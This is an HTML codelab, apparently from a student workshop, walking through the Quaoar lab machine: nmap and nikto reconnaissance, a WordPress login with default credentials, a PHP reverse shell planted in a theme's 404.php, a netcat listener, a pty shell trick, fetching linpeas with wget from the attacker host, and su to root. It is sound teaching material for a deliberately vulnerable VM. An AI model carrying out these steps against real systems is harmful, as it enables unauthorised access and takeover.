
<!doctype html>

<html>
<head>
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
  <meta name="theme-color" content="#4F7DC9">
  <meta charset="UTF-8">
  <title>Pentesting 1 : Introduction to Penetration Testing</title>
  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
  <style>
    .success {
      color: #1e8e3e;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
  <google-codelab codelab-gaid=""
                  id="pentesting-1"
                  title="Pentesting 1 : Introduction to Penetration Testing"
                  environment="web"
                  feedback-link="https://discord.com/invite/52amuPv">
    
      <google-codelab-step label="Introduction" duration="5">
        <h2 is-upgraded>What We&#39;ll Learn</h2>
<p>In this codelab we&#39;ll learn some basic techniques for penetration testing. We have prepared a vulnerable machine on which we can perform our &#34;testing&#34; locally so that everything works as intended.</p>
<p>We have covered the basics of Kali Linux in the previous workshop, and so the only requirement is to download the target machine, <a href="https://www.vulnhub.com/entry/hackfest2016-quaoar,180/" target="_blank">QUAOAR</a> and just follow the easy installation steps (for VirtualBox).</p>
<p>This is how the machine should look like so you know it is indeed working properly. <img alt="virtual box" src="img/949a81e18b27df6.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Recoinassence" duration="10">
        <p>We will start right of the bat with the network recoinassence. For that, we will use a tool called nmap. This will automatically find the open ports of our machine. See the image below on the command that we have used.</p>
<p class="image-container"><img alt="nmap" src="img/6fcea3a0963a274d.png"></p>
<p>As we can tell from the nmap scan, there are a lot of interesting ports. Should we want to investigate further, a more comprehensive nmap command will surely provide some vital information:</p>
<pre><code># Nmap 7.80 scan initiated Wed Nov 11 19:24:25 2020 as: nmap -p- -A -oN nmap 192.168.1.45
Nmap scan report for Quaoar.home (192.168.1.45)
Host is up (0.00063s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html).
110/tcp open  pop3?
|_pop3-capabilities: SASL PIPELINING UIDL RESP-CODES TOP STLS CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2020-11-11T18:27:11+00:00; -1s from scanner time.
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: post-login listed LITERAL+ IMAP4rev1 have more IDLE OK SASL-IR ID ENABLE STARTTLS capabilities Pre-login LOGINDISABLEDA0001 LOGIN-REFERRALS
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2020-11-11T18:27:11+00:00; -1s from scanner time.
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
|_imap-capabilities: post-login listed LITERAL+ IMAP4rev1 have AUTH=PLAINA0001 IDLE OK SASL-IR ID ENABLE more capabilities Pre-login LOGIN-REFERRALS
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2020-11-11T18:27:11+00:00; -1s from scanner time.
995/tcp open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: USER PIPELINING UIDL SASL(PLAIN) TOP RESP-CODES CAPA
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
|_ssl-date: 2020-11-11T18:27:11+00:00; -1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 49m59s, deviation: 2h02m28s, median: -1s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   Computer name: Quaoar
|   NetBIOS computer name: 
|   Domain name: home
|   FQDN: Quaoar.home
|_  System time: 2020-11-11T13:27:03-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

</code></pre>


      </google-codelab-step>
    
      <google-codelab-step label="Port 80 findings" duration="10">
        <p>As you can tell, there really are a lot of open ports; however, there is an interesting one for the keen eye. On port 80, nmap found that there is robots.txt which is, in fact, a really common way of &#34;giving away&#34; free Vulnerable machine hints. This would want to simulate the real-world scenario where you could find some paths which shouldn&#39;t normally be available and thus leak some server information.</p>
<p>To add something here, we can use another commonly used tool called <code>nikto</code>. Nikto is a web-application security tool which finds <code>low-hanging fruits</code> such as what technology is used on the web server, what kind of common directories it has, etc. Here you have the output of running <code>nikto</code> on our target.</p>
<p class="image-container"><img alt="nikto" src="img/945680a955871db.png"><img alt="nikto_output" src="img/a3b4231a06ec2ab9.png"></p>
<p>Nikto found something interesting here, and to be more specific it tells us that the server has a Wordpress page running on it. Should have we visited <code>robots.txt</code> at first however, we would see that there we also have hinted that there is Wordpress installed.</p>
<p class="image-container"><img alt="robots.txt" src="img/93e32f7db0f125aa.png"></p>


      </google-codelab-step>
    
      <google-codelab-step label="Moving onto Wordpress" duration="10">
        <p>If you did not know that already(hopefully you did), Wordpress is a free and open-source content management system written in PHP and paired with a MySQL or MariaDB database. Features include a plugin architecture and a template system, referred to within WordPress as Themes. (Wikipedia definition) 62% of CMS websites are built using it, and that only shows how often you will encounter this application while doing penetration testing(whether in real world or simply in CTF challenges).</p>
<p>After accesing the <code>/wordpress</code> path, we can see that there is a login form. Almost 30% of WordPress websites takeovers have been a result of default credentials that have not been reseted ever since installing WordPress. Thus, the first thing that you should always do when you encounter CMS&#39;s of any kind should be: 1) Looking up for default credentials and 2) Trying a combination of those credentials with other common credentials(such as admin/ admin , admin/password) etc.</p>
<p class="image-container"><img alt="wordpress_login" src="img/acfef33ef207742b.png"></p>
<p>In this case, <code>admin/admin</code> did the work and we can successfully login as a WordPress admin.</p>
<p class="image-container"><img alt="wordpress_mainpage" src="img/12a08386e2344881.png"></p>
<p>Here is the homepage of the Wordpress page from our target. We could poke around the settings and rest of the plugins, however it will be a waste of time. Now it is the time to find a way of connecting to the server itself, because Wordpress can execute code (for getting a reverse shell) if you know how to tell it to do so.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Wordpress reverse shell" duration="10">
        <p>A quick search on our friend Google for <code>Wordpress reverse shell</code> will bring the following concludent results:</p>
<p class="image-container"><img alt="404_reverseshell_injection" src="img/9e957bbfde5ad1a8.png"></p>
<p>Following the guide from there, we inject the reverse shell code from pentest monkey into the 404.php file from the twenty fourteen theme as so:</p>
<p class="image-container"><img alt="404_wordpress_target" src="img/75f166dbdd01e47a.png"></p>
<p>After we adapted the ip and port to our attacking machine one&#39;s we can save click Update File. We can find our machine&#39;s ip as follows:</p>
<p class="image-container"><img alt="my_ip" src="img/d7b5b6fcd3c0f894.png"></p>
<p>After that, we can use netcat to start listening for incoming connections(ofc i&#39;ll pick port 1337 for that)</p>
<p class="image-container"><img alt="nc_listening_port" src="img/fef3b4a8350eb776.png"></p>
<p>Voilla! We are connected :) We will also use a little trick(I will post a link with more common used tricks in penetration testing, but for now just do as we show you :) )</p>
<pre><code>python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre>
<p>This will escape the current &#34;bash jail&#34; and allow us to execute commands from within the bash shell, just as we would normally do through the terminal/ connecting through the ssh.</p>


      </google-codelab-step>
    
      <google-codelab-step label="Local exploit suggester" duration="15">
        <p>Normally, after gaining foothold, one would start looking for ways to escalate their privileges within the system hierarchy, aiming for the <code>root</code> user. In our case, we can start with a trick, this would involve using an automated vulnerability scanner for local privilege escalation, called linPEAS(put a link to it here)</p>
<p>The easiest way of dragging the vulnerability scanner script is through http, and for that I create a simple http server with python :</p>
<p class="image-container"><img alt="simple_http_server" src="img/fb43b24e52d7f339.png"></p>
<p>And then grab the file from the target machine with <code>wget http://192.168.1.122/linpeas.sh</code></p>
<p>After we have the file, we can run it and then investigate the results.</p>
<p class="image-container"><img alt="linpeas_results" src="img/3b5a87a04c2bd82e.png"></p>
<p>The first result will indicate a Kernel Exploit, however this would just be the simple path and you don&#39;t want that every time, so for this workshop we will just skip that way.</p>
<p class="image-container"><img alt="linpeas_mysql" src="img/7e683f1d91652c7f.png"></p>
<p>As we were searching for some interesting information in the output of linpeas, we find some mysql credentials. In this case, we see that the username and password would also match a Linux username and password, and if we tried connecting to the sudo user with <code>su</code> and using the password found by linpeas... surprise surprise:</p>


      </google-codelab-step>
    
      <google-codelab-step label="Final privilege escalation and root" duration="5">
        <p class="image-container"><img alt="root" src="img/1fd37fb2db7b2683.png"></p>
<p>We are <code>root</code>! Also get the flag.txt, which is usually what you would look for in  this kind of pentesting challenges.</p>


      </google-codelab-step>
    
  </google-codelab>

  <script src="https://storage.googleapis.com/codelab-elements/native-shim.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
  <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
  <script src="//support.google.com/inapp/api.js"></script>

</body>
</html>
